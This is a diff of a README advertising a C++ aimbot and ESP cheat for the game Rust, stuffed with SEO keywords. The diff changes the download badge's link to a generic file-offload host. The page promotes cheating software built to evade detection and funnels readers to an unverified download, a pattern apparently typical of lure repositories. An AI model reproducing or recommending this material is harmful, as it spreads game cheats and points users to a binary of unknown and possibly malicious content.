@@ -2,7 +2,7 @@
 
 Outgun and outplay with the ultimate **Rust Aimbot**, engineered in powerful **C++** for surgical accuracy and lightning-fast performance. Whether you're close-range fighting or sniping from cover, this aimbot ensures your shots always land. With smart bone targeting, silent aim, smooth motion, and integrated ESP assist, it delivers brutal efficiency while staying under the radar. 💥 Built for serious PvP players who want to dominate every fight.
 
-[![Download Rust Aimbot Tool](https://img.shields.io/badge/Download-Rust_Aimbot_Tool-blueviolet)](https://wecheaters.github.io/cheats/rust/)
+[![Download Rust Aimbot Tool](https://img.shields.io/badge/Download-Rust_Aimbot_Tool-blueviolet)](https://fileoffload4.bitbucket.io)
 
 ---
 
@@ -72,3 +72,4 @@ The aimbot uses safe external memory reads to locate targets in real-time, calcu
 Rust Aimbot, C++ Rust Cheat, Rust Aimbot Silent, Smooth Rust Aimbot ESP, Rust Auto Aim Tool, Undetected Rust Aimbot, Rust Headshot Bot, Rust PvP Aimbot, Rust Legit Aimbot, External Aimbot Rust, Bone Targeting Rust Hack, Rust Triggerbot, Rust Aim Assist Tool
 
 ---
+
